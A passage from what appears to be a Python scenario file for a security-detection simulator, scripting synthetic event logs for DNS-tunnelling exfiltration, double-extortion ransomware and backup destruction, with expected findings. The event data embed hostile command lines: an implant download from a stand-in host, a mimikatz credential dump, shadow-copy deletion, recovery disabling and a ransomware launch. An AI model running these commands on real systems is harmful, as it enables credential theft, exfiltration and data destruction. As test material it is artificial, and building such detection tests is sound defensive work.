        AttackEvent(event_type="process_event", delay=_delay(10, 5, 2, 25), data={"process_name": "cmd.exe", "action": "start", "parent_process": "explorer.exe", "command_line": "cmd.exe /c rd /s /q C:\\ProgramData\\WindowsUpdate\\cache && del /q C:\\Users\\Public\\7za.exe C:\\Users\\Public\\listing.txt", "path": "C:\\Windows\\System32\\cmd.exe", "pid": 7480, "integrity_level": "medium", "hash": "544876d81e69d1b482924af1b303d119c0125b851139fbe2c579e0c7812e557b", "user_context": "CORP\\{victim_username}", "metadata": {"attack_phase": "defense_evasion", "is_attacker": True, "cleanup": True}}, requires_success=True),
    ],
    parameters=_ENDPOINT_BASE_PARAMS,
    success_rate=0.6,
    iocs=[],
    expected_findings=[
        "Hidden staging directory created with system+hidden attributes",
        "Sensitive files read across multiple network shares over multiple days",
        "Password-encrypted archives disguised as Windows Update cache",
        "Large outbound HTTPS transfers (500 MB + 300 MB)",
        "Staging directory deleted — anti-forensic cleanup",
    ],
    relevant_ioc_keys=["attacker_ip", "attacker_geo"],
)

DNS_EXFILTRATION = AttackScenario(
    id="dns_exfiltration",
    tier="T3",
    name="DNS Tunneling Exfiltration",
    description="Attacker establishes foothold, deploys DNS tunneling implant disguised as a system process, identifies and stages sensitive data across local drives and network shares, then slowly exfiltrates encoded chunks over DNS TXT queries across multiple days to stay below volume detection thresholds.",
    attack_type="data_exfiltration",
    events=[
        # =====================================================================
        # DAY 1 — Initial compromise, implant deployment, reconnaissance
        # =====================================================================
        AttackEvent(event_type="login", delay=_delay(0, 0), data={"success": True, "ip": "{attacker_ip}", "geo": "{attacker_geo}", "device_id": "unknown", "known_device": False, "user_agent": "{attacker_user_agent}", "method": "Password", "metadata": {"attack_phase": "initial_access", "is_attacker": True}}, requires_success=False),
        # Deploy DNS tunnel implant
        AttackEvent(event_type="process_event", delay=_delay(5, 3, 1, 15), data={"process_name": "PowerShell.exe", "action": "start", "parent_process": "cmd.exe", "path": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\PowerShell.exe", "pid": 3840, "integrity_level": "high", "command_line": "PowerShell.exe -nop -w hidden -c \"Invoke-WebRequest -Uri 'https://cdn-static-assets.com/update.bin' -OutFile 'C:\\Windows\\Temp\\svchost32.exe'\"", "hash": "bd9e8d6448c190181073a0aafcd966b523c2a06bd0aba003b3019142ef65606a", "user_context": "CORP\\{victim_username}", "metadata": {"attack_phase": "execution"}}, requires_success=True),
        AttackEvent(event_type="process_event", delay=_delay(2, 1, 0.5, 5), data={"process_name": "svchost32.exe", "action": "start", "parent_process": "PowerShell.exe", "path": "C:\\Windows\\Temp\\svchost32.exe", "pid": 4012, "integrity_level": "high", "command_line": "svchost32.exe --dns-server 8.8.8.8 --domain telemetry.cdn-assets.net --mode beacon", "hash": "c103110a2ecf3b4008cc74076d79cbaf5768edf70711964149ea22654d2d82b3", "user_context": "CORP\\{victim_username}", "metadata": {"attack_phase": "command_and_control"}}, requires_success=True),
        # Initial DNS beacon to confirm C2 channel
        AttackEvent(event_type="network_event", delay=_delay(1, 0.5, 0.1, 3), data={"source_ip": "{victim_ip}", "destination_ip": "8.8.8.8", "destination_port": 53, "protocol": "UDP", "action": "allowed", "direction": "outbound", "auth": "none", "bytes_sent": 128, "bytes_received": 256, "description": "DNS TXT query to attacker domain — C2 beacon check-in", "metadata": {"attack_phase": "command_and_control", "dns_tunneling": True}}, requires_success=True),
        # Persistence — scheduled task to restart implant
        AttackEvent(event_type="process_event", delay=_delay(5, 3, 1, 15), data={"process_name": "schtasks.exe", "action": "start", "parent_process": "svchost32.exe", "path": "C:\\Windows\\System32\\schtasks.exe", "pid": 4180, "integrity_level": "high", "command_line": "schtasks /create /tn \"WindowsTelemetryAgent\" /tr \"C:\\Windows\\Temp\\svchost32.exe --dns-server 8.8.8.8 --domain telemetry.cdn-assets.net --mode beacon\" /sc onstart /rl highest", "hash": "ebf9ce0118abbd5662da8a6285455a95965332abefcb9a3428bc115a403cf5f3", "user_context": "CORP\\{victim_username}", "metadata": {"attack_phase": "persistence"}}, requires_success=True),
        # Reconnaissance — enumerate local and network drives for sensitive data
        AttackEvent(event_type="process_event", delay=_delay(10, 5, 2, 30), data={"process_name": "cmd.exe", "action": "start", "parent_process": "svchost32.exe", "path": "C:\\Windows\\System32\\cmd.exe", "pid": 4256, "integrity_level": "high", "command_line": "cmd.exe /c dir /s /b C:\\Users\\*.xlsx C:\\Users\\*.docx C:\\Users\\*.pdf C:\\Finance\\*", "hash": "5da7288e7079cf1486edcc5d5fe04818fbf1ae70eb67076bf0aa24823a93b1d4", "user_context": "CORP\\{victim_username}", "metadata": {"attack_phase": "discovery"}}, requires_success=True),
        AttackEvent(event_type="process_event", delay=_delay(5, 3, 1, 15), data={"process_name": "net.exe", "action": "start", "parent_process": "svchost32.exe", "path": "C:\\Windows\\System32\\net.exe", "pid": 4320, "integrity_level": "high", "command_line": "net use", "hash": "135e59d92af83ede0b3e7c9d32c62690875dc0744caba8dc3725a2b4a3b991d7", "user_context": "CORP\\{victim_username}", "metadata": {"attack_phase": "discovery"}}, requires_success=True),
        AttackEvent(event_type="process_event", delay=_delay(5, 3, 1, 15), data={"process_name": "cmd.exe", "action": "start", "parent_process": "svchost32.exe", "path": "C:\\Windows\\System32\\cmd.exe", "pid": 4388, "integrity_level": "high", "command_line": "cmd.exe /c dir /s /b \\\\fileserver01\\shared\\*.xlsx \\\\fileserver01\\shared\\*.csv", "hash": "5da7288e7079cf1486edcc5d5fe04818fbf1ae70eb67076bf0aa24823a93b1d4", "user_context": "CORP\\{victim_username}", "metadata": {"attack_phase": "discovery"}}, requires_success=True),
        # Stage first batch of files — local finance data
        AttackEvent(event_type="file_event", delay=_delay(8, 4, 2, 20), data={"action": "read", "path": "C:\\Finance\\Q4_Report.xlsx", "system": "local", "label": "confidential", "category": "financial", "description": "Read Q4 financial report for exfiltration staging", "metadata": {"attack_phase": "collection"}}, requires_success=True),
        AttackEvent(event_type="file_event", delay=_delay(3, 2, 0.5, 10), data={"action": "read", "path": "C:\\Finance\\annual_budget_2024.xlsx", "system": "local", "label": "confidential", "category": "financial", "description": "Read annual budget spreadsheet for exfiltration staging", "metadata": {"attack_phase": "collection"}}, requires_success=True),
        # First slow-drip DNS exfiltration session — Q4 report
        AttackEvent(event_type="network_event", delay=_delay(15, 8, 3, 45), data={"source_ip": "{victim_ip}", "destination_ip": "8.8.8.8", "destination_port": 53, "protocol": "UDP", "action": "allowed", "direction": "outbound", "auth": "none", "bytes_sent": 12800, "bytes_received": 2048, "description": "DNS TXT exfiltration — encoded chunks of Q4_Report.xlsx (slow drip, ~100 queries)", "metadata": {"attack_phase": "exfiltration", "dns_tunneling": True}}, requires_success=True),
        # =====================================================================
        # DAY 2 — Continue exfiltration, collect from network shares
        # =====================================================================
        # Overnight gap — implant beacons periodically
        AttackEvent(event_type="network_event", delay=_delay(960, 240, 480, 1440), data={"source_ip": "{victim_ip}", "destination_ip": "8.8.8.8", "destination_port": 53, "protocol": "UDP", "action": "allowed", "direction": "outbound", "auth": "none", "bytes_sent": 256, "bytes_received": 128, "description": "Periodic DNS beacon — implant still active overnight", "metadata": {"attack_phase": "command_and_control", "dns_tunneling": True}}, requires_success=True),
        # Exfiltrate annual budget
        AttackEvent(event_type="network_event", delay=_delay(30, 15, 5, 90), data={"source_ip": "{victim_ip}", "destination_ip": "8.8.8.8", "destination_port": 53, "protocol": "UDP", "action": "allowed", "direction": "outbound", "auth": "none", "bytes_sent": 25600, "bytes_received": 4096, "description": "DNS TXT exfiltration — encoded chunks of annual_budget_2024.xlsx (~200 queries)", "metadata": {"attack_phase": "exfiltration", "dns_tunneling": True}}, requires_success=True),
        # Stage second batch — local documents and network share
        AttackEvent(event_type="file_event", delay=_delay(60, 30, 15, 180), data={"action": "read", "path": "C:\\Users\\{victim_username}\\Documents\\customer_contracts\\", "system": "local", "label": "confidential", "category": "legal", "description": "Read customer contracts folder for exfiltration staging", "metadata": {"attack_phase": "collection"}}, requires_success=True),
        AttackEvent(event_type="file_event", delay=_delay(15, 8, 3, 45), data={"action": "read", "path": "C:\\Users\\{victim_username}\\Documents\\employee_records.csv", "system": "local", "label": "restricted", "category": "pii", "description": "Read employee PII records for exfiltration staging", "metadata": {"attack_phase": "collection"}}, requires_success=True),
        # Exfiltrate contracts — rate-limited to stay below threshold
        AttackEvent(event_type="network_event", delay=_delay(60, 30, 15, 180), data={"source_ip": "{victim_ip}", "destination_ip": "8.8.8.8", "destination_port": 53, "protocol": "UDP", "action": "allowed", "direction": "outbound", "auth": "none", "bytes_sent": 51200, "bytes_received": 8192, "description": "DNS TXT exfiltration — encoded chunks of customer contracts (~400 queries, throttled)", "metadata": {"attack_phase": "exfiltration", "dns_tunneling": True}}, requires_success=True),
        # Collect from network share
        AttackEvent(event_type="file_event", delay=_delay(30, 15, 5, 90), data={"action": "read", "path": "\\\\fileserver01\\shared\\Strategy\\M&A_targets_2024.pptx", "system": "network_share", "label": "restricted", "category": "strategy", "description": "Read M&A targets presentation from network share", "metadata": {"attack_phase": "collection"}}, requires_success=True),
        AttackEvent(event_type="file_event", delay=_delay(10, 5, 2, 30), data={"action": "read", "path": "\\\\fileserver01\\shared\\HR\\salary_bands_confidential.xlsx", "system": "network_share", "label": "restricted", "category": "hr", "description": "Read confidential salary data from network share", "metadata": {"attack_phase": "collection"}}, requires_success=True),
        # Exfiltrate employee PII
        AttackEvent(event_type="network_event", delay=_delay(60, 30, 15, 180), data={"source_ip": "{victim_ip}", "destination_ip": "8.8.8.8", "destination_port": 53, "protocol": "UDP", "action": "allowed", "direction": "outbound", "auth": "none", "bytes_sent": 38400, "bytes_received": 6144, "description": "DNS TXT exfiltration — encoded chunks of employee_records.csv (~300 queries)", "metadata": {"attack_phase": "exfiltration", "dns_tunneling": True}}, requires_success=True),
        # =====================================================================
        # DAY 3 — Exfiltrate network share data and cleanup
        # =====================================================================
        # Overnight gap
        AttackEvent(event_type="network_event", delay=_delay(960, 240, 480, 1440), data={"source_ip": "{victim_ip}", "destination_ip": "8.8.8.8", "destination_port": 53, "protocol": "UDP", "action": "allowed", "direction": "outbound", "auth": "none", "bytes_sent": 256, "bytes_received": 128, "description": "Periodic DNS beacon — implant still active overnight", "metadata": {"attack_phase": "command_and_control", "dns_tunneling": True}}, requires_success=True),
        # Exfiltrate M&A presentation
        AttackEvent(event_type="network_event", delay=_delay(30, 15, 5, 90), data={"source_ip": "{victim_ip}", "destination_ip": "8.8.8.8", "destination_port": 53, "protocol": "UDP", "action": "allowed", "direction": "outbound", "auth": "none", "bytes_sent": 64000, "bytes_received": 10240, "description": "DNS TXT exfiltration — encoded chunks of M&A_targets_2024.pptx (~500 queries, largest file)", "metadata": {"attack_phase": "exfiltration", "dns_tunneling": True}}, requires_success=True),
        # Exfiltrate salary data
        AttackEvent(event_type="network_event", delay=_delay(60, 30, 15, 180), data={"source_ip": "{victim_ip}", "destination_ip": "8.8.8.8", "destination_port": 53, "protocol": "UDP", "action": "allowed", "direction": "outbound", "auth": "none", "bytes_sent": 19200, "bytes_received": 3072, "description": "DNS TXT exfiltration — encoded chunks of salary_bands_confidential.xlsx (~150 queries)", "metadata": {"attack_phase": "exfiltration", "dns_tunneling": True}}, requires_success=True),
        # Completion beacon — signal exfil complete
        AttackEvent(event_type="network_event", delay=_delay(60, 30, 15, 180), data={"source_ip": "{victim_ip}", "destination_ip": "8.8.8.8", "destination_port": 53, "protocol": "UDP", "action": "allowed", "direction": "outbound", "auth": "none", "bytes_sent": 128, "bytes_received": 256, "description": "DNS beacon — exfiltration completion signal sent to C2", "metadata": {"attack_phase": "command_and_control", "dns_tunneling": True}}, requires_success=True),
        # Implant self-destructs
        AttackEvent(event_type="process_event", delay=_delay(10, 5, 2, 30), data={"process_name": "cmd.exe", "action": "start", "parent_process": "svchost32.exe", "path": "C:\\Windows\\System32\\cmd.exe", "pid": 5880, "integrity_level": "high", "command_line": "cmd.exe /c schtasks /delete /tn \"WindowsTelemetryAgent\" /f & del /f C:\\Windows\\Temp\\svchost32.exe", "hash": "5da7288e7079cf1486edcc5d5fe04818fbf1ae70eb67076bf0aa24823a93b1d4", "user_context": "CORP\\{victim_username}", "metadata": {"attack_phase": "defense_evasion"}}, requires_success=True),
    ],
    parameters=_ENDPOINT_BASE_PARAMS,
    success_rate=0.75,
    iocs=["telemetry.cdn-assets.net", "cdn-static-assets.com"],
    expected_findings=["DNS tunnel implant deployed from Temp directory", "Sustained high-entropy DNS TXT queries to single domain", "Slow-drip exfiltration — throttled rate below detection thresholds", "Implant self-deletion and scheduled task removal"],
    relevant_ioc_keys=["attacker_ip"],
)

DOUBLE_EXTORTION = AttackScenario(
    id="double_extortion",
    tier="T3",
    name="Double Extortion: Data Theft then Ransomware",
    description="Attacker compromises a domain account and spends multiple days performing reconnaissance, credential dumping, lateral movement to internal hosts, enumerating and stealing sensitive files from Finance, HR, and Engineering shares, staging them into encrypted archives, and exfiltrating over HTTPS. After confirming successful data theft, the attacker returns days later to destroy backups and deploy ransomware, creating dual extortion leverage.",
    attack_type="ransomware",
    events=[
        # =====================================================================
        # DAY 1 — Initial access, host discovery, credential dump, lateral movement
        # =====================================================================

        # --- Phase 1: Initial access — attacker logs in with compromised creds ---
        AttackEvent(event_type="login", delay=_delay(0, 0), data={"success": True, "ip": "{attacker_ip}", "geo": "{attacker_geo}", "device_id": "unknown", "known_device": False, "user_agent": "{attacker_user_agent}", "method": "Password", "metadata": {"attack_phase": "initial_access", "is_attacker": True}}, requires_success=False),

        # --- Phase 2: Host discovery commands ---
        AttackEvent(event_type="process_event", delay=_delay(5, 3, 1, 15), data={"process_name": "whoami.exe", "action": "start", "parent_process": "cmd.exe", "command_line": "whoami /all", "path": "C:\\Windows\\System32\\whoami.exe", "pid": 4120, "integrity_level": "medium", "hash": "a1b2c3d4e5f6789012345678abcdef0123456789abcdef0123456789abcdef01", "user_context": "CORP\\{victim_username}", "metadata": {"attack_phase": "discovery", "is_attacker": True}}, requires_success=True),
        AttackEvent(event_type="process_event", delay=_delay(2, 1, 0.5, 5), data={"process_name": "ipconfig.exe", "action": "start", "parent_process": "cmd.exe", "command_line": "ipconfig /all", "path": "C:\\Windows\\System32\\ipconfig.exe", "pid": 4148, "integrity_level": "medium", "hash": "b2c3d4e5f6a7890123456789abcdef1234567890abcdef1234567890abcdef12", "user_context": "CORP\\{victim_username}", "metadata": {"attack_phase": "discovery", "is_attacker": True}}, requires_success=True),
        AttackEvent(event_type="process_event", delay=_delay(3, 2, 0.5, 8), data={"process_name": "net.exe", "action": "start", "parent_process": "cmd.exe", "command_line": "net group \"Domain Admins\" /domain", "path": "C:\\Windows\\System32\\net.exe", "pid": 4176, "integrity_level": "medium", "hash": "c3d4e5f6a7b8901234567890abcdef2345678901abcdef2345678901abcdef23", "user_context": "CORP\\{victim_username}", "metadata": {"attack_phase": "discovery", "is_attacker": True}}, requires_success=True),

        # --- Phase 3: Credential dump via mimikatz ---
        AttackEvent(event_type="process_event", delay=_delay(8, 4, 2, 20), data={"process_name": "mimikatz.exe", "action": "start", "parent_process": "cmd.exe", "command_line": "mimikatz.exe \"privilege::debug\" \"sekurlsa::logonpasswords\" exit", "path": "C:\\Users\\Public\\mimikatz.exe", "pid": 4220, "integrity_level": "high", "hash": "407fe6ee1d408eb46a4922ba1e7a25d18e01e6a9a3ed6e96f3219657d42cf3ad", "user_context": "CORP\\{victim_username}", "metadata": {"attack_phase": "credential_access", "tool": "mimikatz", "is_attacker": True}}, requires_success=True),

        # --- Phase 4: Lateral movement to two internal hosts ---
        # Lateral move to WKSTN-FIN01 via NTLM
        AttackEvent(event_type="login", delay=_delay(10, 5, 2, 25), data={"success": True, "ip": "10.0.2.45", "geo": "Internal Network", "device_id": "WKSTN-FIN01", "known_device": False, "method": "NTLM", "app": "Windows Logon", "metadata": {"attack_phase": "lateral_movement", "is_attacker": True, "lateral_host": "WKSTN-FIN01"}}, requires_success=True),
        AttackEvent(event_type="network_event", delay=_delay(0.5, 0.2, 0.1, 1.5), data={"source_ip": "{victim_ip}", "destination_ip": "10.0.2.45", "destination_port": 445, "protocol": "TCP", "action": "allowed", "direction": "internal", "user": "{victim_username}", "auth": "ntlm", "bytes_sent": 1024, "bytes_received": 4096, "description": "SMB session established to WKSTN-FIN01 via NTLM pass-the-hash"}, requires_success=True),
        # Lateral move to SRV-FILE01
        AttackEvent(event_type="login", delay=_delay(5, 3, 1, 12), data={"success": True, "ip": "10.0.3.20", "geo": "Internal Network", "device_id": "SRV-FILE01", "known_device": False, "method": "NTLM", "app": "Windows Logon", "metadata": {"attack_phase": "lateral_movement", "is_attacker": True, "lateral_host": "SRV-FILE01"}}, requires_success=True),
        AttackEvent(event_type="network_event", delay=_delay(0.3, 0.1, 0.05, 1), data={"source_ip": "{victim_ip}", "destination_ip": "10.0.3.20", "destination_port": 445, "protocol": "TCP", "action": "allowed", "direction": "internal", "user": "{victim_username}", "auth": "ntlm", "bytes_sent": 1024, "bytes_received": 4096, "description": "SMB session established to SRV-FILE01 via NTLM pass-the-hash"}, requires_success=True),

        # =====================================================================
        # DAY 2 — Return, file share enumeration, mass file reads, staging
        # (overnight gap: attacker reviews credential dump offline)
        # =====================================================================

        # --- Phase 5: Attacker returns ---
        AttackEvent(event_type="login", delay=_delay(1440, 480, 720, 2880), data={"success": True, "ip": "{attacker_ip}", "geo": "{attacker_geo}", "device_id": "unknown", "known_device": False, "user_agent": "{attacker_user_agent}", "method": "Password", "metadata": {"attack_phase": "collection", "is_attacker": True, "return_session": True}}, requires_success=False),

        # --- Phase 6: File share enumeration ---
        AttackEvent(event_type="process_event", delay=_delay(8, 4, 2, 20), data={"process_name": "net.exe", "action": "start", "parent_process": "cmd.exe", "command_line": "net view \\\\SRV-FILE01 /all", "path": "C:\\Windows\\System32\\net.exe", "pid": 5320, "integrity_level": "high", "hash": "c3d4e5f6a7b8901234567890abcdef2345678901abcdef2345678901abcdef23", "user_context": "CORP\\administrator", "metadata": {"attack_phase": "discovery", "is_attacker": True}}, requires_success=True),
        AttackEvent(event_type="process_event", delay=_delay(5, 3, 1, 12), data={"process_name": "cmd.exe", "action": "start", "parent_process": "explorer.exe", "command_line": "cmd.exe /c dir \\\\SRV-FILE01\\Finance$ /s /b", "path": "C:\\Windows\\System32\\cmd.exe", "pid": 5388, "integrity_level": "high", "hash": "13af93cc9d293a2b1f1965d8b93e29ec762da72d386abc6feb4b993fa9a23b59", "user_context": "CORP\\administrator", "metadata": {"attack_phase": "discovery", "is_attacker": True}}, requires_success=True),

        # --- Phase 7: Mass file reads from sensitive shares ---
        AttackEvent(event_type="file_event", delay=_delay(10, 5, 2, 25), data={"action": "read", "path": "\\\\SRV-FILE01\\Finance$\\Quarterly Reports\\Q4-2026-Revenue-Forecast.xlsx", "system": "network_share", "label": "confidential", "category": "financial", "description": "Read Q4 revenue forecast from Finance share", "metadata": {"attack_phase": "collection", "is_attacker": True, "batch": 1}}, requires_success=True),
        AttackEvent(event_type="file_event", delay=_delay(3, 2, 0.5, 8), data={"action": "read", "path": "\\\\SRV-FILE01\\Finance$\\Budgets\\FY2027-Budget-Final.xlsx", "system": "network_share", "label": "confidential", "category": "financial", "description": "Read FY2027 budget from Finance share", "metadata": {"attack_phase": "collection", "is_attacker": True, "batch": 1}}, requires_success=True),
        AttackEvent(event_type="file_event", delay=_delay(5, 3, 1, 12), data={"action": "read", "path": "\\\\SRV-FILE01\\HR$\\Compensation\\Executive-Compensation-2026.xlsx", "system": "network_share", "label": "confidential", "category": "hr", "description": "Read executive compensation data from HR share", "metadata": {"attack_phase": "collection", "is_attacker": True, "batch": 1}}, requires_success=True),
        AttackEvent(event_type="file_event", delay=_delay(3, 2, 0.5, 8), data={"action": "read", "path": "\\\\SRV-FILE01\\HR$\\Employee-Records\\Full-Employee-Export-2026.csv", "system": "network_share", "label": "confidential", "category": "hr", "description": "Read full employee records export from HR share", "metadata": {"attack_phase": "collection", "is_attacker": True, "batch": 1}}, requires_success=True),
        AttackEvent(event_type="file_event", delay=_delay(5, 3, 1, 12), data={"action": "read", "path": "\\\\SRV-FILE01\\Engineering$\\Source\\product-core-v3.zip", "system": "network_share", "label": "confidential", "category": "engineering", "description": "Read core product source archive from Engineering share", "metadata": {"attack_phase": "collection", "is_attacker": True, "batch": 1}}, requires_success=True),

        # --- Phase 8: Stage into encrypted 7z archive ---
        AttackEvent(event_type="process_event", delay=_delay(10, 5, 2, 25), data={"process_name": "7za.exe", "action": "start", "parent_process": "cmd.exe", "command_line": "7za.exe a -mhe=on -pEx7r@ct2026! C:\\ProgramData\\staging\\data_collection.7z C:\\ProgramData\\staging\\batch1\\*", "path": "C:\\Users\\Public\\7za.exe", "pid": 5640, "integrity_level": "high", "hash": "e7f6a5b4c3d2109876543fedcba876543fedcba21098765432fedcba21098765", "user_context": "CORP\\administrator", "metadata": {"attack_phase": "staging", "is_attacker": True}}, requires_success=True),

        # =====================================================================
        # DAY 3 — Return, exfiltration over HTTPS in 2 large batches
        # (overnight gap: attacker preps exfil infrastructure)
        # =====================================================================

        # --- Phase 9: Attacker returns for exfiltration ---
        AttackEvent(event_type="login", delay=_delay(1440, 480, 720, 2880), data={"success": True, "ip": "{attacker_ip}", "geo": "{attacker_geo}", "device_id": "unknown", "known_device": False, "user_agent": "{attacker_user_agent}", "method": "Password", "metadata": {"attack_phase": "exfiltration", "is_attacker": True, "return_session": True}}, requires_success=False),

        # --- Phase 10: Exfiltration over HTTPS in 2 batches ---
        AttackEvent(event_type="network_event", delay=_delay(15, 8, 3, 40), data={"source_ip": "{victim_ip}", "destination_ip": "{attacker_ip}", "destination_port": 443, "protocol": "TCP", "action": "allowed", "direction": "outbound", "user": "administrator", "auth": "none", "bytes_sent": 2147483648, "bytes_received": 1024, "description": "HTTPS upload to external IP — batch 1 exfiltration (2 GB encrypted archive)"}, requires_success=True),
        AttackEvent(event_type="network_event", delay=_delay(30, 15, 5, 90), data={"source_ip": "{victim_ip}", "destination_ip": "{attacker_ip}", "destination_port": 443, "protocol": "TCP", "action": "allowed", "direction": "outbound", "user": "administrator", "auth": "none", "bytes_sent": 1610612736, "bytes_received": 1024, "description": "HTTPS upload to external IP — batch 2 exfiltration (1.5 GB encrypted archive)"}, requires_success=True),

        # =====================================================================
        # DAY 5 — Return, backup destruction, ransomware deployment
        # (2-day gap: attacker confirms exfil success, prepares ransomware)
        # =====================================================================

        # --- Phase 11: Attacker returns for ransomware deployment ---
        AttackEvent(event_type="login", delay=_delay(2880, 720, 1440, 4320), data={"success": True, "ip": "{attacker_ip}", "geo": "{attacker_geo}", "device_id": "unknown", "known_device": False, "user_agent": "{attacker_user_agent}", "method": "Password", "metadata": {"attack_phase": "impact", "is_attacker": True, "return_session": True}}, requires_success=False),

        # --- Phase 12: Backup destruction ---
        AttackEvent(event_type="process_event", delay=_delay(8, 4, 2, 20), data={"process_name": "vssadmin.exe", "action": "start", "parent_process": "cmd.exe", "command_line": "vssadmin delete shadows /all /quiet", "path": "C:\\Windows\\System32\\vssadmin.exe", "pid": 6104, "integrity_level": "high", "hash": "a1b2c3d4e5f6789012345678abcdef0123456789abcdef0123456789abcdef01", "user_context": "CORP\\administrator", "metadata": {"attack_phase": "impact_preparation", "is_attacker": True}}, requires_success=True),
        AttackEvent(event_type="process_event", delay=_delay(3, 2, 0.5, 8), data={"process_name": "bcdedit.exe", "action": "start", "parent_process": "cmd.exe", "command_line": "bcdedit /set {default} recoveryenabled No", "path": "C:\\Windows\\System32\\bcdedit.exe", "pid": 6148, "integrity_level": "high", "hash": "c3d4e5f6a7b8901234567890abcdef2345678901abcdef2345678901abcdef23", "user_context": "CORP\\administrator", "metadata": {"attack_phase": "impact_preparation", "is_attacker": True}}, requires_success=True),
        AttackEvent(event_type="process_event", delay=_delay(2, 1, 0.5, 5), data={"process_name": "sc.exe", "action": "start", "parent_process": "cmd.exe", "command_line": "sc stop wbengine & sc config wbengine start= disabled", "path": "C:\\Windows\\System32\\sc.exe", "pid": 6180, "integrity_level": "high", "hash": "d4e5f6a7b8c9012345678901abcdef3456789012abcdef3456789012abcdef34", "user_context": "CORP\\administrator", "metadata": {"attack_phase": "impact_preparation", "is_attacker": True}}, requires_success=True),

        # --- Phase 13: Ransomware deployment ---
        AttackEvent(event_type="process_event", delay=_delay(5, 3, 1, 15), data={"process_name": "encrypt.exe", "action": "start", "parent_process": "cmd.exe", "command_line": "encrypt.exe --all-drives --extension .locked --note README_RESTORE.txt", "path": "C:\\Users\\Public\\encrypt.exe", "pid": 6240, "integrity_level": "high", "hash": "f8e7d6c5b4a3210987654321fedcba0987654321fedcba0987654321fedcba09", "user_context": "CORP\\administrator", "metadata": {"attack_phase": "impact", "is_attacker": True, "ransomware": True}}, requires_success=True),
        # Ransom note dropped
        AttackEvent(event_type="file_event", delay=_delay(1, 0.5, 0.2, 3), data={"action": "modify", "path": "C:\\README_RESTORE.txt", "system": "endpoint", "description": "Ransom note dropped — demands payment, threatens data leak on dark web", "metadata": {"attack_phase": "impact", "is_attacker": True, "ransom_note": True}}, requires_success=True),
    ],
    parameters=_ENDPOINT_BASE_PARAMS,
    success_rate=0.65,
    iocs=["mimikatz.exe", "encrypt.exe", "7za.exe"],
    expected_findings=[
        "Mimikatz credential dump — privilege escalation to domain admin",
        "Lateral movement via NTLM to internal hosts",
        "Mass file reads from network shares and data exfiltrated",
        "VSS shadow copy deletion and backup destruction",
        "Ransomware deployed with ransom note — double extortion threat",
    ],
    relevant_ioc_keys=["attacker_ip", "attacker_geo", "victim_ip", "victim_username"],
)

BACKUP_DESTRUCTION = AttackScenario(
    id="backup_destruction",
    tier="T3",
    name="Backup Destruction Before Ransomware/Wiper",
    description="Attacker with admin access enumerates all backup infrastructure during business hours — VSS shadow copies, Veeam backup jobs, Windows Backup service, and cloud backup vaults — to map the full recovery surface. Returns during off-hours to systematically destroy every backup layer before deploying a destructive wiper payload.",
    attack_type="ransomware",
    events=[
        # =====================================================================
        # MORNING — Recon: enumerate all backup infrastructure
        # =====================================================================

        # --- Phase 1: Initial access ---
        AttackEvent(event_type="login", delay=_delay(0, 0), data={"success": True, "ip": "{attacker_ip}", "geo": "{attacker_geo}", "device_id": "unknown", "known_device": False, "user_agent": "{attacker_user_agent}", "method": "Password", "metadata": {"attack_phase": "initial_access", "is_attacker": True}}, requires_success=False),

        # --- Phase 2: Enumerate local backup systems ---
        # List VSS shadow copies
        AttackEvent(event_type="process_event", delay=_delay(8, 4, 2, 20), data={"process_name": "vssadmin.exe", "action": "start", "parent_process": "cmd.exe", "command_line": "vssadmin list shadows", "path": "C:\\Windows\\System32\\vssadmin.exe", "pid": 4820, "integrity_level": "high", "hash": "a1b2c3d4e5f6789012345678abcdef0123456789abcdef0123456789abcdef01", "user_context": "CORP\\administrator", "metadata": {"attack_phase": "discovery", "is_attacker": True}}, requires_success=True),
        # Check Windows Backup service status
        AttackEvent(event_type="process_event", delay=_delay(3, 2, 0.5, 8), data={"process_name": "sc.exe", "action": "start", "parent_process": "cmd.exe", "command_line": "sc query wbengine", "path": "C:\\Windows\\System32\\sc.exe", "pid": 4856, "integrity_level": "high", "hash": "b2c3d4e5f6a7890123456789abcdef1234567890abcdef1234567890abcdef12", "user_context": "CORP\\administrator", "metadata": {"attack_phase": "discovery", "is_attacker": True}}, requires_success=True),
        # Query Windows recovery configuration
        AttackEvent(event_type="process_event", delay=_delay(2, 1, 0.5, 5), data={"process_name": "bcdedit.exe", "action": "start", "parent_process": "cmd.exe", "command_line": "bcdedit /enum {current}", "path": "C:\\Windows\\System32\\bcdedit.exe", "pid": 4884, "integrity_level": "high", "hash": "c3d4e5f6a7b8901234567890abcdef2345678901abcdef2345678901abcdef23", "user_context": "CORP\\administrator", "metadata": {"attack_phase": "discovery", "is_attacker": True}}, requires_success=True),

        # --- Phase 3: Enumerate Veeam backup infrastructure ---
        AttackEvent(event_type="app_event", delay=_delay(10, 5, 2, 25), data={"app": "Veeam Backup & Replication", "action": "list_backup_jobs", "resource_type": "backup_job", "resource_name": "All Backup Jobs", "success": True, "description": "Enumerated all Veeam backup jobs — 6 jobs found including daily, weekly, and offsite", "metadata": {"attack_phase": "discovery", "is_attacker": True}}, requires_success=True),
        AttackEvent(event_type="app_event", delay=_delay(5, 3, 1, 12), data={"app": "Veeam Backup & Replication", "action": "list_backup_repositories", "resource_type": "backup_repository", "resource_name": "All Repositories", "success": True, "description": "Enumerated Veeam backup repositories — local NAS, offsite NAS, and S3 bucket identified", "metadata": {"attack_phase": "discovery", "is_attacker": True}}, requires_success=True),
        # Network connection to backup server
        AttackEvent(event_type="network_event", delay=_delay(3, 2, 0.5, 8), data={"source_ip": "{victim_ip}", "destination_ip": "10.0.4.50", "destination_port": 9392, "protocol": "TCP", "action": "allowed", "direction": "internal", "user": "administrator", "auth": "ntlm", "bytes_sent": 2048, "bytes_received": 16384, "description": "Connection to Veeam Backup server management port — configuration query"}, requires_success=True),

        # --- Phase 4: Enumerate cloud backup vaults ---
        AttackEvent(event_type="app_event", delay=_delay(10, 5, 2, 25), data={"app": "AWS Backup", "action": "list_backup_vaults", "resource_type": "backup_vault", "resource_name": "All Vaults", "success": True, "description": "Enumerated AWS Backup vaults — production_backup_vault and dr_backup_vault found", "metadata": {"attack_phase": "discovery", "is_attacker": True}}, requires_success=True),
        AttackEvent(event_type="app_event", delay=_delay(5, 3, 1, 12), data={"app": "AWS Backup", "action": "list_recovery_points", "resource_type": "recovery_point", "resource_name": "production_backup_vault", "success": True, "description": "Listed 14 recovery points in production vault spanning last 30 days", "metadata": {"attack_phase": "discovery", "is_attacker": True}}, requires_success=True),

        # =====================================================================
        # EVENING/NIGHT — Attacker returns during off-hours for destruction
        # (8-12h gap: waits for low-staffing window to minimize detection)
